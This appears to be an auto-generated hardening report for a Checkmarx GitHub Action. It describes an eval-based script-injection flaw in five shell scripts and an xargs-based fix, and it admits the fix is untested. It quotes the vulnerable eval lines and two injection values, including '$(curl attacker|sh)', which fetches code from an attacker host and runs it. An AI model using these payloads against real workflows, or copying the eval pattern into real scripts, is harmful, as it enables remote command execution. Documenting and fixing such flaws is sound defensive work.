<!-- markdownlint-disable -->

# Hardening Report: Checkmarx--ast-github-action/2.3.47

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **Checkmarx--ast-github-action/2.3.47** was hardened automatically. 1 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### script-injection (severity: high)

The Docker entrypoint script (/app/entrypoint.sh) sources scripts that pass workflow-controlled input values through eval. The values come from the action inputs global_params, scan_params, additional_params, utils_params and results_params, which reach the scripts as env vars. The variable is expanded inside a double-quoted eval string, so eval parses it a second time. A value such as '$(curl attacker|sh)' or 'x); id; (' therefore runs arbitrary commands in the container. Offending lines: scripts/scan.sh:9 `eval "global_arr=(${GLOBAL_PARAMS})"`, scripts/scan.sh:16 `eval "scan_arr=(${SCAN_PARAMS})"`, scripts/scan.sh:24 `eval "scan_arr=(${ADDITIONAL_PARAMS})"`, scripts/results.sh:10 `eval "results_arr=(${RESULTS_PARAMS})"`, scripts/pr_decoration.sh:9 `eval "utils_arr=(${UTILS_PARAMS})"`. Fix: split the values into arrays without eval, for example with `read -r -a arr <<< "$VAR"` or xargs-style parsing.

Locations:

- `scripts/scan.sh:9`
- `scripts/scan.sh:16`
- `scripts/scan.sh:24`
- `scripts/results.sh:10`
- `scripts/pr_decoration.sh:9`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection

**Notes:**

Removed all five `eval "arr=(${VAR})"` lines from scripts/scan.sh, scripts/results.sh and scripts/pr_decoration.sh. They now call a new helper, scripts/split_params.sh (already copied into the image by the existing `COPY scripts /app/scripts/`). The helper splits the value the way a shell would, keeping single- and double-quoted groups together, by piping it through `xargs -r printf '%s\0'` into a `read -d ''` loop. It nothing in the value gets run: `$(...)`, backticks, `;` and `)` are passed as plain text. If a quote is left unmatched, the helper checks with `xargs -r true` first, then reports the problem and exits. Each variable is checked for emptiness on its own before splitting, so an empty input adds no arguments. The scripts stay bash and the shebangs are unchanged. Not tested; the Dockerfile shows no bash install of its own, so this assumes the checkmarx/ast-cli base image provides bash and xargs, as the existing `#!/bin/bash` scripts already require. Behaviour change: variable references inside these parameter strings (such as ${GITHUB_WORKSPACE}) are no longer expanded and now reach the CLI as literal text.

